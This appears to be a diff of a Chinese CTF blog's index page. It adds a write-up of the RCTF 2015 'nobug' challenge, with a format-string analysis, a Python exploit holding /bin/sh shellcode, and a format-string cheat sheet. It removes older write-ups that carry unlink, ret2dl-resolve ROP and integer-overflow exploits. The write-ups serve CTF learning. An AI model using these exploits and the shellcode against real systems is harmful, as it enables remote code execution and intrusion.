@@ -298,8 +298,8 @@
             
               
                 
-                <a class="post-title-link" href="/2016/08/17/xdctf-qual-2015-pwn300/" itemprop="url">
-                  xdctf-qual-2015-pwn300
+                <a class="post-title-link" href="/2016/09/07/rctf-qual-2015-nobug/" itemprop="url">
+                  rctf-qual-2015-nobug
                 </a>
               
             
@@ -312,8 +312,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-17T00:00:00+08:00" content="2016-08-17">
-              2016-08-17
+            <time itemprop="dateCreated" datetime="2016-09-07T00:00:00+08:00" content="2016-09-07">
+              2016-09-07
             </time>
           </span>
 
@@ -342,8 +342,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/08/17/xdctf-qual-2015-pwn300/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/17/xdctf-qual-2015-pwn300/" itemprop="commentsCount"></span>
+                <a href="/2016/09/07/rctf-qual-2015-nobug/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/07/rctf-qual-2015-nobug/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -371,8 +371,21 @@
             <h1 id="Environment">Environment</h1><blockquote>
 <p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_i386</p>
 </blockquote>
-<h1 id="Conclusion">Conclusion</h1><p>题目是自己写的malloc和free，最简单的<code>unlink</code>漏洞</p>
-<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./aa508d1df74d46a88bc02210c7f92824'</span></span><br><span class="line">io      = zio(target, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>, timeout = <span class="number">100000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_girl</span><span class="params">(typ)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your Choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Give the type of the Girl:'</span>)</span><br><span class="line">    io.writeline(str(typ))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_girl</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your Choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Give the Girl id to delete:'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_girl</span><span class="params">(idx, typ, girl)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your Choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Give the Girl id to edit:'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line">    io.read_until(<span class="string">'Give the type to edit:'</span>)</span><br><span class="line">    io.writeline(str(typ))</span><br><span class="line">    io.read_until(<span class="string">'Give your Girl:'</span>)</span><br><span class="line">    io.writeline(girl)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_girl</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your Choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'4'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Give the Girlid to print:'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line"></span><br><span class="line">got_puts    = <span class="number">0x804b014</span></span><br><span class="line">adr_buf     = <span class="number">0x804b060</span></span><br><span class="line"></span><br><span class="line">add_girl(<span class="number">1</span>)</span><br><span class="line">add_girl(<span class="number">2</span>)</span><br><span class="line">add_girl(<span class="number">1</span>)</span><br><span class="line">edit_girl(<span class="number">0</span>, <span class="number">2</span>, <span class="string">'A'</span> * (<span class="number">0xe0</span> - <span class="number">0xc</span>) + l32(adr_buf - <span class="number">8</span>) + l32(got_puts))</span><br><span class="line">edit_girl(<span class="number">2</span>, <span class="number">1</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">del_girl(<span class="number">1</span>)</span><br><span class="line">show_girl(<span class="number">0</span>)</span><br><span class="line">adr_puts = l32(io.read(<span class="number">5</span>)[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">off_puts    = <span class="number">0x00065650</span></span><br><span class="line">off_system  = <span class="number">0x00040190</span></span><br><span class="line">adr_libc    = adr_puts - off_puts</span><br><span class="line">adr_system  = adr_libc + off_system</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] libc base : &#123;&#125;'</span>.format(hex(adr_libc))</span><br><span class="line"></span><br><span class="line">edit_girl(<span class="number">0</span>, <span class="number">1</span>, l32(adr_system))</span><br><span class="line"></span><br><span class="line">io.writeline(<span class="string">'4'</span>)</span><br><span class="line">io.writeline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+<h1 id="Bug">Bug</h1><p>格式化字符串漏洞fsb</p>
+<h1 id="Conclusion">Conclusion</h1><p>可以看到在0x8048b76函数处，0x8048bc0处开始的代码有点诡异。<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">.text:08048B76 sub_8048B76     proc near               ; CODE XREF: sub_8048BD4+6&#25;p&#10;.text:08048B76                 push    ebp&#10;.text:08048B77                 mov     ebp, esp&#10;.text:08048B79                 sub     esp, 18h&#10;.text:08048B7C                 mov     dword ptr [esp], offset s ; s&#10;.text:08048B83                 call    _strlen&#10;.text:08048B88                 mov     dword ptr [esp+8], 0&#10;.text:08048B90                 mov     [esp+4], eax&#10;.text:08048B94                 mov     dword ptr [esp], offset s&#10;.text:08048B9B                 call    base64_decode&#10;.text:08048BA0                 mov     [esp+0Ch], eax&#10;.text:08048BA4                 mov     dword ptr [esp+8], offset format ; &#34;%s&#34;&#10;.text:08048BAC                 mov     dword ptr [esp+4], 800h ; maxlen&#10;.text:08048BB4                 mov     dword ptr [esp], offset pt ; s&#10;.text:08048BBB                 call    _snprintf&#10;.text:08048BC0                 push    offset sub_8048BD1&#10;.text:08048BC5                 push    offset sub_8048B32&#10;.text:08048BCA                 push    0&#10;.text:08048BCC                 lea     esp, [esp+4]&#10;.text:08048BD0                 retn</span><br></pre></td></tr></table></figure></p>
+<p>正常应该是以如下结尾，然后正常的ret回调用它的指令的下一跳指令处。</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mov     esp, ebp&#10;pop     ebp&#10;ret</span><br></pre></td></tr></table></figure>
+<p>而程序里的这段代码，则是return到0x8048b32函数，然后开始执行</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048B32</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v1; <span class="comment">// eax@1</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v1 = (<span class="keyword">const</span> <span class="keyword">char</span> *)base64_decode((<span class="keyword">int</span>)s, v0, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">snprintf</span>(pt, <span class="number">0x800</span>u, v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的函数执行完后ret到0x8048bd1处</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">08048BD1        pop     eax&#10;08048BD2        leave&#10;08048BD3        retn</span><br></pre></td></tr></table></figure>
+<p>所以从0x8048b32函数开始，程序连着经历两次<code>leave ret</code></p>
+<p>另外0x8048b32函数处有明显的格式化字符串漏洞，又由于程序是不断循环执行的，因此相当于可以不断的利用这个fsb，这就和<a href="http://0byjwzsf.me/2016/08/09/pwnable-rookiss-fsb/">pwnable.kr-fsb</a>有点像了，那题的最开始的想法是篡改<code>got表</code>，那自然想到我们这里也可以做到修改<code>got</code>表。</p>
+<p>具体的思考过程就是：在栈上存在天然的一对引用关系，即函数调用的上一个栈帧的ebp（记为ebp1）指向下一个栈帧的ebp（记为ebp2），那我们可以利用%n往ebp1上写，来修改ebp2使其指向需要修改的任意内存（理论上，不考虑速度的话），之后再利用%n往ebp2上写，即可实现任意地址写，控制程序流执行存放在0x804a8a0处的shellcode（这块内存是程序用来存放解码后的字符串的）</p>
+<p>当然，这种做法是不实际的，只是理论上可行，因为要考虑print的字符太多的情况下，会很耗时间。实际情况可以利用<code>%hn</code>或者<code>%hhn</code>。</p>
+<p>想到这里本以为题目已经解决了，我只要构造形如<code>%0{}x%4$hhn.%{}x%12$hn</code>的格式化字符串即可完成任意地址写，可是实际情况是，在前一个<code>%hhn</code>写入后修改了ebp2，后一个<code>%hn</code>不会修改已经修改后的ebp2指向的内存，而是修改之前的ebp2指向的内存。这就很尴尬了。</p>
+<p>后来是运气好解决了这问题，大致思路，观察栈上哪里有0x804a8a0，修改<code>ebp</code>为栈上的某个地址（需要先泄露栈的地址)，使得再经历几次<code>leave</code>的<strong><em>stack pivoting</em></strong>后，在ret时，esp恰好指向0x804a8a0。</p>
+<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io  = zio(target = <span class="string">'./nobug_acc0c1b37bec49e0575c94a3916cc771'</span>, timeout = <span class="number">100000</span>)</span><br><span class="line">io.hint([<span class="number">0x08048b6f</span>])</span><br><span class="line">fs1 = <span class="string">'%4$08x'</span></span><br><span class="line">io.wl(b64encode(fs1))</span><br><span class="line">esp = int(io.r(<span class="number">8</span>)[<span class="number">5</span>:], <span class="number">16</span>) + <span class="number">0x4</span></span><br><span class="line"><span class="keyword">print</span> hex(esp)</span><br><span class="line"><span class="keyword">print</span> fs1</span><br><span class="line"><span class="comment"># fs2 = '%0&#123;&#125;x%4$hhn%0&#123;&#125;x%12$08x'.format(esp, 0xa8a0 - esp)</span></span><br><span class="line">shellcode = (</span><br><span class="line">            <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"</span></span><br><span class="line">            <span class="string">"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"</span></span><br><span class="line">            )</span><br><span class="line">fs2 = shellcode + <span class="string">'%0&#123;&#125;x%4$hhn'</span>.format(esp - len(shellcode))</span><br><span class="line"><span class="keyword">print</span> fs2</span><br><span class="line">io.wl(b64encode(fs2))</span><br><span class="line">io.itr()</span><br></pre></td></tr></table></figure>
 
           
         
@@ -422,8 +435,8 @@
             
               
                 
-                <a class="post-title-link" href="/2016/08/17/xdctf-qual-2015-pwn200/" itemprop="url">
-                  xdctf-qual-2015-pwn200
+                <a class="post-title-link" href="/2016/09/07/fsb-sum-up/" itemprop="url">
+                  格式化字符串漏洞总结
                 </a>
               
             
@@ -436,277 +449,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-17T00:00:00+08:00" content="2016-08-17">
-              2016-08-17
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/CTFs/" itemprop="url" rel="index">
-                    <span itemprop="name">CTFs</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/08/17/xdctf-qual-2015-pwn200/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/17/xdctf-qual-2015-pwn200/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Environment">Environment</h1><blockquote>
-<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_i386</p>
-</blockquote>
-<h1 id="Conclusion">Conclusion</h1><p>之前看过<a href="http://drops.wooyun.org/binary/14360" target="_blank" rel="external">@糖果师傅</a>的文章，当时也照着文章做了一遍。今天心血来潮又自己独立试了一下。</p>
-<p>对于利用来说，其实只要在<code>.bss段</code>伪造三个结构即可，其分别对应<code>.rel.plt</code>，<code>.dymsym</code>，<code>.dynstr</code>中的结构体，这些段的地址可利用readelf查看，如下所示</p>
-<p><img src="/images/xdctf-qual-2015-pwn200/1.jpg" alt=""></p>
-<p>对于<code>.rel.plt段</code></p>
-<p><img src="/images/xdctf-qual-2015-pwn200/2-1.jpg" alt=""></p>
-<p>可在<strong>gdb</strong>中查看，结构与上图对应</p>
-<p><img src="/images/xdctf-qual-2015-pwn200/2-2.jpg" alt=""></p>
-<p>对于<code>.dynsym段</code></p>
-<p><img src="/images/xdctf-qual-2015-pwn200/3-1.jpg" alt=""></p>
-<p>在<strong>gdb</strong>中查看，结果同样与上图对应</p>
-<p><img src="/images/xdctf-qual-2015-pwn200/3-2.jpg" alt=""></p>
-<p><code>.dynstr段</code></p>
-<p><img src="/images/xdctf-qual-2015-pwn200/4.jpg" alt=""></p>
-<p>dl-resolve会根据下图中<code>plt</code>红框所示部分作为<code>.rel.plt</code>中的偏移，去寻找对应的结构体</p>
-<p><img src="/images/xdctf-qual-2015-pwn200/5.jpg" alt=""></p>
-<p>然后根据偏移找到对应的结构体后，会以<code>info&gt;&gt;8 * 16</code>作为偏移，在<code>.dynsym</code>中寻找对应的结构体</p>
-<p>找到<code>.dynsym</code>中对应的结构体后，会根据其<code>st_name</code>成员作为偏移量，在<code>dynstr</code>中寻找对应的要解析的函数名字符串</p>
-<p>在写exp的时候，只要查看已有的这些结构，去修改其中的作为寻找待解析函数名字符串的一些偏移量即可</p>
-<p>另外，这些都是在32位上试的，64位会有不同，目前还没去试过。</p>
-<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./c14595742a95ebf0944804d8853b834c'</span></span><br><span class="line">io      = zio(target, print_read = COLORED(RAW, <span class="string">'blue'</span>), print_write = COLORED(RAW, <span class="string">'green'</span>), timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x804839b</span>])</span><br><span class="line"></span><br><span class="line">io.read_line()</span><br><span class="line"></span><br><span class="line">plt_read    = <span class="number">0x08048390</span></span><br><span class="line">plt_resolve = <span class="number">0x0804839b</span></span><br><span class="line"></span><br><span class="line">leave_ret   = <span class="number">0x08048481</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x08048453</span></span><br><span class="line">ppp_ret     = <span class="number">0x0804856c</span></span><br><span class="line"></span><br><span class="line">adr_stage   = <span class="number">0x0804a000</span> + <span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">payload0  = <span class="string">'A'</span> * <span class="number">0x70</span></span><br><span class="line">payload0 += l32(plt_read)</span><br><span class="line">payload0 += l32(ppp_ret)</span><br><span class="line">payload0 += l32(<span class="number">0</span>)</span><br><span class="line">payload0 += l32(adr_stage)</span><br><span class="line">payload0 += l32(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">payload0 += l32(pop_ebp_ret)</span><br><span class="line">payload0 += l32(adr_stage)</span><br><span class="line">payload0 += l32(leave_ret)</span><br><span class="line">payload0 += l32(plt_resolve)</span><br><span class="line"></span><br><span class="line">io.writeline(payload0)</span><br><span class="line"></span><br><span class="line">adr_rel_plt         = <span class="number">0x8048318</span></span><br><span class="line">adr_dyn_sym         = <span class="number">0x80481d8</span></span><br><span class="line">adr_dyn_str         = <span class="number">0x8048268</span></span><br><span class="line">adr_fake_rel_plt    = adr_stage + <span class="number">0x100</span></span><br><span class="line">adr_fake_dyn_sym    = adr_stage + <span class="number">0x208</span></span><br><span class="line">adr_fake_dyn_str    = adr_stage + <span class="number">0x300</span></span><br><span class="line">adr_shell           = adr_stage + <span class="number">0x400</span></span><br><span class="line"></span><br><span class="line">got_read        = <span class="number">0x804a004</span></span><br><span class="line"></span><br><span class="line">payload1  = <span class="string">'A'</span> * <span class="number">0x4</span></span><br><span class="line">payload1 += l32(plt_resolve)</span><br><span class="line">payload1 += l32(adr_fake_rel_plt - adr_rel_plt)</span><br><span class="line">payload1 += l32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload1 += l32(adr_shell)</span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x100</span>, <span class="string">'A'</span>)</span><br><span class="line">payload1 += l32(got_read)</span><br><span class="line">payload1 += l32((adr_fake_dyn_sym - adr_dyn_sym)/<span class="number">0x10</span>*<span class="number">0x100</span> + <span class="number">0x7</span>)</span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x208</span>, <span class="string">'A'</span>)</span><br><span class="line">payload1 += l32(adr_fake_dyn_str - adr_dyn_str)</span><br><span class="line">payload1 += l32(<span class="number">0x0</span>)</span><br><span class="line">payload1 += l32(<span class="number">0x0</span>)</span><br><span class="line">payload1 += l32(<span class="number">0x12</span>)</span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x300</span>, <span class="string">'A'</span>)</span><br><span class="line">payload1 += <span class="string">'system\x00'</span></span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x400</span>, <span class="string">'A'</span>)</span><br><span class="line">payload1 += <span class="string">'/bin/sh\x00'</span></span><br><span class="line"></span><br><span class="line">io.writeline(payload1)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
-<h1 id="Reference">Reference</h1><p><a href="http://drops.wooyun.org/binary/14360" target="_blank" rel="external">http://drops.wooyun.org/binary/14360</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/08/17/xdctf-qual-2015-pwn400/" itemprop="url">
-                  xdctf-qual-2015-pwn400
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-17T00:00:00+08:00" content="2016-08-17">
-              2016-08-17
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/CTFs/" itemprop="url" rel="index">
-                    <span itemprop="name">CTFs</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/08/17/xdctf-qual-2015-pwn400/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/17/xdctf-qual-2015-pwn400/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Environment">Environment</h1><blockquote>
-<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_i386</p>
-</blockquote>
-<h1 id="Conclusion">Conclusion</h1><p>代码很长，IDA f5要看好久，不过关键点就在一个无符号整数溢出的地方，如下所示。本地测试</p>
-<p><img src="/images/xdctf-qual-2015-pwn400/1.jpg" alt=""></p>
-<p><code>v13+2</code>不能过大，但是这里如果输入<code>0xffff</code>就会溢出，即可绕过判断</p>
-<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = (<span class="string">'0'</span>, <span class="number">8888</span>)</span><br><span class="line">io      = zio(target, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>, timeout = <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">'PK\x01\x02'</span></span><br><span class="line">payload += <span class="string">'A'</span> * <span class="number">24</span></span><br><span class="line">payload += l32(<span class="number">0xffff</span>)</span><br><span class="line">payload += <span class="string">'B'</span> * <span class="number">14</span></span><br><span class="line">payload  = payload.ljust(<span class="number">200</span>, <span class="string">'C'</span>)</span><br><span class="line">io.writeline(payload)</span><br><span class="line">io.read_until(<span class="string">'f'</span>)</span><br><span class="line">flag = <span class="string">'f'</span> + io.read_until(<span class="string">'&#125;'</span>)</span><br><span class="line">io.read_line()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/08/14/pwnable-rookiss-fix/" itemprop="url">
-                  pwnable.kr-rookiss-fix
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-14T00:00:00+08:00" content="2016-08-14">
-              2016-08-14
+            <time itemprop="dateCreated" datetime="2016-09-07T00:00:00+08:00" content="2016-09-07">
+              2016-09-07
             </time>
           </span>
 
@@ -735,8 +479,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/08/14/pwnable-rookiss-fix/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/14/pwnable-rookiss-fix/" itemprop="commentsCount"></span>
+                <a href="/2016/09/07/fsb-sum-up/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/07/fsb-sum-up/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -761,20 +505,26 @@
       
         
           
-            <h1 id="Conclusion">Conclusion</h1><p>容易发现shellcode存在栈上，而这也是bug所在，因为在shellcode执行过程中，随着栈帧的变化，会覆盖了还没执行完的shellcode</p>
-<p>shellcode如下所示</p>
-<p><img src="/images/pwnable.kr-rookiss-fix/1.jpg" alt=""></p>
-<p>可以看到，在执行到<code>push eax</code>时，栈已经上升到了0xffbf3ca4，此时只要执行一次<code>push eax</code>，就会刚好覆盖了shellcode的末端</p>
-<p><img src="/images/pwnable.kr-rookiss-fix/2.jpg" alt=""></p>
-<p><img src="/images/pwnable.kr-rookiss-fix/3.jpg" alt=""></p>
-<h2 id="Trials">Trials</h2><p>1.我第一个想到的是前几天刚见过的<code>popad</code>指令，这个指令也恰好只有1个字节，这个指令能一次性连续pop多次，可以把栈往下降一下，这样在执行的过程中就不会覆盖到shellcode了，不过用来传参的寄存器的值就被破坏了，试了多次无果<br>2.后来又试了修改第2个字节，使<code>xor eax, eax</code>转为<code>xor esp, eax</code>，虽然能也能达到降低栈的目的，不过传参的寄存器还是不能设置好，无果</p>
-<p>想了许久想不出来，只好又求助google大法了，找到了一位菊苣的解法，将指令<code>push eax</code>，改为<code>pop esp</code>，这样做同时达成了两个目的，既没有破坏寄存器参数的布置，同时又转移了栈帧</p>
-<p>这时会有另一个问题，<code>pop esp</code>，会将<code>esp</code>修改为<code>0x6e69622f</code>，作为栈，需要满足这块内存是可写可读的，但是这块内存区域是没有被分配的，这就成了一个问题</p>
-<p><img src="/images/pwnable.kr-rookiss-fix/4.jpg" alt=""></p>
-<p>不过这题是个本地利用，也就是说我们可以利用<code>ulimit -s unlimited</code>指令来扩大栈的最大大小，这样当<code>esp</code>转移到了<code>0x6e69622f</code>时，会有一个内存访问错误，操作系统会自动把栈进行扩充，也就达到了将<code>esp</code>进行转移的目的，同时被修改的原指令<code>push eax</code>的作用（在栈上填充null）又“顺带”完成了</p>
-<p><img src="/images/pwnable.kr-rookiss-fix/5.jpg" alt=""></p>
-<h1 id="Exploit">Exploit</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">icemakr:~$ ssh fix@pwnable.kr -p2222</span><br><span class="line"></span><br><span class="line">fix@ubuntu:~$ <span class="built_in">ulimit</span> <span class="operator">-s</span> unlimited</span><br><span class="line">fix@ubuntu:~$ ./fix</span><br><span class="line">What the hell is wrong with my shellcode??????</span><br><span class="line">I just copied and pasted it from shell-storm.org :(</span><br><span class="line">Can you fix it <span class="keyword">for</span> me?</span><br><span class="line">Tell me the byte index to be fixed : <span class="number">15</span></span><br><span class="line">Tell me the valude to be patched : <span class="number">92</span></span><br><span class="line">get shell</span><br><span class="line">$ ls</span><br><span class="line">fix  fix.c  flag</span><br><span class="line">$ cat flag</span><br><span class="line">Sorry <span class="keyword">for</span> blaming shell-strom.org :) it was my ignorance!</span><br></pre></td></tr></table></figure>
-<h1 id="Reference">Reference</h1><p><a href="https://blog.stypr.com/2015/09/27/pwnable-fix/" target="_blank" rel="external">https://blog.stypr.com/2015/09/27/pwnable-fix/</a></p>
+            <p>因为碰到了挺多fsb的题目，然后每次居然都会忘记一部分格式，所以还是记录一下好了。</p>
+<h1 id="0x1_使用">0x1 使用</h1><p>注：这里仅以<code>printf</code>函数为例</p>
+<h2 id="32位">32位</h2><h3 id="读">读</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="string">'%&#123;&#125;$x'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>           <span class="comment">// 读4个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$p'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>           <span class="comment">// 同上面</span></span><br><span class="line"><span class="string">'$&#123;&#125;$s'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span></span><br></pre></td></tr></table></figure>
+<h3 id="写">写</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="string">'%&#123;&#125;$n'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>           <span class="comment">// 解引用，写入四个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$hn'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>          <span class="comment">// 解引用，写入两个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$hhn'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>         <span class="comment">// 解引用，写入一个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$lln'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>         <span class="comment">// 解引用，写入八个字节</span></span><br></pre></td></tr></table></figure>
+<h2 id="64位">64位</h2><h3 id="读-1">读</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="string">'%&#123;&#125;$x'</span>.<span class="function"><span class="title">format</span><span class="params">(index, num)</span></span>      <span class="comment">// 读4个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$lx'</span>.<span class="function"><span class="title">format</span><span class="params">(index, num)</span></span>     <span class="comment">// 读8个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$p'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>           <span class="comment">// 读8个字节</span></span><br><span class="line"><span class="string">'$&#123;&#125;$s'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span></span><br></pre></td></tr></table></figure>
+<h3 id="写-1">写</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="string">'%&#123;&#125;$n'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>           <span class="comment">// 解引用，写入四个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$hn'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>          <span class="comment">// 解引用，写入两个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$hhn'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>         <span class="comment">// 解引用，写入一个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$lln'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>         <span class="comment">// 解引用，写入八个字节</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>%1$lx</code>: RSI</li>
+<li><code>%2$lx</code>: RDX</li>
+<li><code>%3$lx</code>: RCX</li>
+<li><code>%4$lx</code>: R8</li>
+<li><code>%5$lx</code>: R9</li>
